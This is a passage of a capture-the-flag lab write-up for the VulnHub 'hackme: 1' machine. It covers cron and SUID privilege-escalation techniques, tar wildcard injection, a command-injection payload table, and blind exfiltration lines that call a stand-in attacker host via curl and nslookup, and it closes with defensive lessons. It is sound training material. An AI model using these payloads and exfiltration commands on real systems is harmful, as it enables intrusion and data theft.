> The `/etc/crontab` fields are `min hour dom mon dow **user** command` — note the
> *user* column, which per-user crontabs do not have. That column is what makes a
> system cron job run as root.
>
> **Three exploitable patterns:**
>
> 1. **The script itself is writable** → append
>    `cp /bin/bash /tmp/rb; chmod +s /tmp/rb`, wait, then run `/tmp/rb -p`.
> 2. **The script calls a binary by a relative name** (`service`, `tar`, `python`) →
>    **PATH hijack**: create `~/evil/service` containing your payload and
>    `export PATH=~/evil:$PATH`. Check whether cron's own `PATH=` line defeats this.
> 3. **Wildcard injection** — a job runs `tar czf backup.tar.gz *` → create files
>    named `--checkpoint=1` and `--checkpoint-action=exec=/tmp/shell.sh`. `tar` reads
>    them as options rather than filenames.
>
> > **The critical gap: root cron jobs that appear in *no* crontab.** They may be
> > installed by a systemd timer, an init script, or a custom daemon.
> >
> > **`pspy` finds them.** It polls `/proc` in a tight loop and therefore sees
> > processes started by *other users* — **without needing root**. Run it and wait 60
> > seconds:
> >
> > ```bash
> > ./pspy64 -pf
> > # watch for: root running /opt/script.py every 5 seconds
> > ```
> >
> > It has won more CTF boxes than almost any other single tool. If `sudo -l`, SUID
> > and capabilities are all dead ends, **run pspy before giving up.**
>
> **Deep dive:** [CONCEPTS §15.5 — Cron jobs](../../docs/CONCEPTS.md#155-cron-jobs)
> ### 📖 Concept — Command injection
>
> The application passes your input to a shell:
>
> ```php
> system("ping -c 4 " . $_GET['host']);
> ```
>
> Break out with a shell **metacharacter** and append your own command:
>
> | Payload | Effect |
> | --- | --- |
> | `; id` | Run sequentially, regardless |
> | `\| id` | Pipe — run next |
> | `\|\| id` | Run only if the first **failed** |
> | `&& id` | Run only if the first **succeeded** |
> | `` `id` `` | Command substitution |
> | `$(id)` | Command substitution — preferred, nestable |
> | `%0a id` | A URL-encoded **newline** — works when `;` and `\|` are filtered |
>
> **When output comes back**, you are done: `<host>;id` prints the result.
>
> **When it does not** ("blind" injection), exfiltrate out-of-band:
>
> ```bash
> $(curl http://attacker/$(whoami))        # data in the URL of a request YOU receive
> $(nslookup $(whoami).attacker.com)       # data in DNS — survives most egress rules
> ; sleep 10                               # a pure timing oracle, needs no network at all
> ```
>
> Run your listener first (`nc -lvnp 80`, or `python3 -m http.server`) and **watch its
> log** — a request arriving with the hostname embedded is your proof, and the log also
> tells you which payload variant the filter allowed through.
>
> **If characters are stripped**, find out exactly what survives. Submit `;|&$\`(){}[]<>`
> as a single string and see which ones come back. Filters are usually a `str_replace`
> of a short list, and almost always miss something — commonly newline, or a doubled
> character (`;;` collapsing to `;` after one removal pass).
>
> **Deep dive:** [CONCEPTS §13.4 — Command injection](../../docs/CONCEPTS.md#134-command-injection)

```bash
id; whoami
sudo -l                                   # can we run anything as root?
find / -perm -4000 -type f 2>/dev/null    # SUID binaries
cat /etc/crontab; ls -la /etc/cron*       # scheduled jobs
uname -a; cat /etc/os-release             # kernel/OS version
```

```text
$ sudo -l
[sudo] password for www-data:
Sorry, user www-data may not run sudo on hackme.

$ find / -perm -4000 -type f 2>/dev/null
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/newgrp
/home/legacy/touchmenot          <-- unusual: a SUID binary in a home directory
```

> **Why it matters:** most of these are normal system binaries. The odd one out is
> `/home/legacy/touchmenot` — a custom, non-standard binary that the system owner
> has given the **SUID** bit and made **owned by root**. When a program is SUID and
> owned by root, it runs with **root's privileges** no matter who launches it.

Inspect and run it:

```bash
ls -la /home/legacy/touchmenot
file  /home/legacy/touchmenot
/home/legacy/touchmenot
```

```text
-rwsr-xr-x 1 root root  ... /home/legacy/touchmenot
/home/legacy/touchmenot: setuid ELF 64-bit LSB executable ...

[ back to a root prompt ]
# id
uid=0(root) gid=0(root) groups=0(root)
```

> **Why it works:** `touchmenot` is a deliberately hidden privilege-escalation
> tool. Because it is SUID-root it spawns a shell that is already `root`, so simply
> executing it hands us a root shell. On a real (unintended) host, an unfamiliar
> SUID binary is a huge red flag — always enumerate `-perm -4000` and check every
> result against [GTFOBins](https://gtfobins.github.io/).

You now have `root`:

```bash
# Confirm
id
# (There is no root.txt on this box; a root shell is the win.)
```

![Executing the SUID binary to become root](images/06-privesc.png)
![Root shell](images/07-root-flag.png)

---

## 5. Summary of vulnerabilities

| # | Vulnerability | Where | Impact |
| --- | --- | --- | --- |
| 1 | SQL injection via unparameterised search query | `welcome.php` search box | Full read of the `webapphacking` database, including password hashes |
| 2 | Weak password storage (unsalted MD5) | `users.password` column | Hashes trivially cracked, admin account taken over |
| 3 | Unrestricted file upload (`.php` accepted) | Admin upload page (`welcomeadmin.php`) | Remote code execution as `www-data` |
| 4 | Hidden SUID-root binary | `/home/legacy/touchmenot` | Local privilege escalation to `root` |

## 6. Defensive lessons (blue team)

- **Parameterise every query.** Use prepared statements / an ORM so user input can
  never change SQL structure. This alone kills the initial SQL injection.
- **Store passwords with a slow, salted KDF** (bcrypt, scrypt, Argon2). A salted
  hash makes dumped hashes useless to precomputed/wordlist cracking.
- **Validate uploads by content, not filename.** Allow-list safe types, verify the
  real MIME/magic bytes, store files **outside** the web root, and disable script
  execution in the upload directory (`php_admin_flag engine off`, or serve uploads
  from a non-executing location).
- **Never leave SUID-root binaries lying around.** Audit `find / -perm -4000` on a
  schedule; remove anything that isn't a known system binary. Turn on file-integrity
  monitoring (e.g. AIDE/Tripwire) to catch new SUID files.
- **Least privilege for the web server.** Run PHP-FPM/Apache as a locked-down user
  with no shell (`/usr/sbin/nologin`) and confine it (containers, AppArmor/SELinux)
  so a web RCE is far less useful.
- **Detection ideas:** watch for `400`-style SQL errors and `UNION SELECT` /
  `information_schema` strings in access logs; alert on new `.php` files appearing
  under upload paths; flag creation of unexpected SUID files and outbound
  connections from the web user (reverse shells).

---

## 7. References

- **Repository primer** — the fundamentals behind every command in this document: [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md)

- VulnHub entry: <https://vulnhub.com/entry/hackme-1,330/>
- Download mirror: <https://download.vulnhub.com/hackme/hackme.ova>
- Community writeups consulted:
  - [hackme: 1: Vulnhub Walkthrough — Hacking Articles](https://www.hackingarticles.in/hackme-1-vulnhub-walkthrough/)
- Docs / tools:
  - [OWASP — SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
  - [OWASP — Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
  - [GTFOBins](https://gtfobins.github.io/)
  - [pentestmonkey — PHP Reverse Shell](https://github.com/pentestmonkey/php-reverse-shell)

---

## 8. Screenshot checklist

- [ ] `images/01-recon.png` — finding the target with `arp-scan`
- [ ] `images/02-nmap.png` — port/service scan and directory discovery
- [ ] `images/03-enum.png` — SQL injection dumping the `users` table
- [ ] `images/04-foothold.png` — uploading / triggering the PHP reverse shell
- [ ] `images/05-shell.png` — shell as `www-data`
- [ ] `images/06-privesc.png` — finding/running `/home/legacy/touchmenot`
- [ ] `images/07-root-flag.png` — proof of `root` (`id` shows `uid=0`)

---

_Part of the [Cybersecurity101-Labs](../../README.md) collection. See the complete [catalog](../../docs/CATALOG.md)._
